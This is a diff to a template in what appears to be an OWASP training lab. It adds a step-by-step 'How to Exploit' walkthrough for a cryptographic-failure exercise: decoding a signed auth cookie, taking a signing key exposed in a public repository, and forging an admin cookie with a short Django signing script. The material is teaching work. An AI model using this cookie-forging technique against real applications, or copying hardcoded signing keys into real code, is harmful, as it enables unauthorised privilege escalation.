@@ -88,15 +88,110 @@
                                 {{ restricted_notice }}
                                 {% if flag %}
                                     <hr>
-                                    <h3>Flag</h3>
-                                    <p>
-                                        <strong>{{ flag }}</strong>
+                                    <p class=" fw-bolder">Flag: &nbsp;
+                                        {{ flag }}
                                     </p>
-
+                                    <div class="d-flex justify-content-center mt-5">
+                                        <a class="btn btn-light btn-sm" href="{% url 'labs:cryptfail' %}#cryptfail_explained"><i class="bi bi-arrow-left"></i> Back to
+                                            Lab</a>
+                                    </div>
                                 {% endif %}
                             </div>
 
                         </div>
+                    </div>
+                    <h5 class="text-white mb-4">How to Exploit</h5>
+                    <div class="card border rounded-4 mb-4 bg-dark color-soft ">
+                        <div class="card-body p-5">
+                            <div class="small color-soft">
+                                <p class="text-white bold h6">Step 1: Retrieve Auth Cookie</p>
+                                <p>Open the browser Developer Tools and locate
+                                    auth cookie</p>
+                                <div class="lab-hint">
+                                    <code>F12 → Application → Storage → Cookies → https://owasp.cyprian.dev</code>
+                                </div>
+                                <p class="mt-2">Locate cookie named 'lab_auth'. The value has a format similar to: </p>
+                                <div class="lab-hint">
+                                    <code>encoded_payload:signature</code>
+                                </div>
+                                <p class="text-white bold h6 mt-3">Step 2: Decode the Cookie</p>
+
+                                <p>We are more interested in the first part of the value. The encoded payload. Open the
+                                    Console of the Developer Tools to decode it.</p>
+                                <div class="lab-hint">
+                                    <code>F12 → Console</code>
+                                </div>
+                                <p class="mt-2">In the prompt, type the following to decode the payload</p>
+                                <div class="lab-hint">
+                                    <code>JSON.parse(atob("encoded_payload"))
+                                    </code>
+                                </div>
+                                <p class="mt-2">The decoded payload outputs to:</p>
+                                <div class="lab-hint">
+                                    <code>{user_id: 101, role: 'guest'}</code>
+                                </div>
+                                <p class="text-white bold h6 mt-3">Step 3: Locate Signing Key from Github <a
+                                        style="color: #62B2FF;text-decoration: none"
+                                        href="https://github.com/cy-cosmic/owasp-lab/blob/main/labs/utils.py"
+                                        target="_blank">Here</a></p>
+                                <p>The signing key is similar to:</p>
+                                <div class="lab-hint">
+                                    <code>SIGNING_KEY = "dev-signing-key-please-rotate"
+                                    </code>
+                                </div>
+                                <p class="mt-2">Exposure of signing keys in public repositories, backup files, or
+                                    version control
+                                    systems is a common real-world mistake</p>
+                                <p class="mt-2">Once the key is known, an attacker can generate valid signatures for
+                                    modified data</p>
+                                <p class="text-white bold h6 mt-3">Step 4: Escalate Privilege</p>
+                                <p class="">Change the JSON payload from</p>
+                                <div class="lab-hint">
+                                    <code>
+                                        {user_id: 101, role: 'guest'}
+                                    </code>
+                                </div>
+                                <p class="mt-2">to</p>
+                                <div class="lab-hint">
+                                    <code>
+                                        {user_id: 1, role: 'admin'}
+                                    </code>
+                                </div>
+                                <p class="text-white bold h6 mt-3">Step 5: Generate a Forged Cookie</p>
+                                <p class="">Run the following script in a virtual environment on your local machine</p>
+                                <div class="lab-hint">
+                                    <code>
+                                        from django.core import signing<br><br>
+                                        payload = { "user_id": 1, "role": "admin" }<br><br>
+                                        forged_cookie = signing.dumps( payload, key="dev-signing-key-please-rotate"
+                                        )<br><br>
+                                        print(forged_cookie)
+                                    </code>
+                                </div>
+                                <p class="mt-2">This produces a valid signed cookie containing the modified role.</p>
+                                <p class="text-white bold h6 mt-3">Step 6: Replace the Cookie in the Browser</p>
+                                <p class="">Open Developer Tools</p>
+                                <div class="lab-hint">
+                                    <code>
+                                        F12 → Application → Storage → Cookies → https://owasp.cyprian.dev
+                                    </code>
+                                </div>
+                                <p class="mt-2">Replace the existing cookie value with the forged one.</p>
+                                <p class="mt-2">Refresh the page</p>
+
+                                <p class="text-white bold h6 mt-3">Step 7: Observe Privilege Escalation</p>
+                                <p class="mt-2">Because the forged cookie has a valid signature, the application trusts
+                                    the modified role.</p>
+                                <p class="mt-2">When you navigate to the top of page, you should now see administrative content and the lab flag, confirming
+                                    successful privilege escalation.</p>
+
+
+                            </div>
+
+                        </div>
+                    </div>
+                    <div class="d-flex justify-content-center mt-5">
+                        <a class="btn btn-light btn-sm" href="{% url 'labs:cryptfail' %}#cryptfail_explained"><i class="bi bi-arrow-left"></i> Back to Lab</a>
                     </div>
                 </section>
 
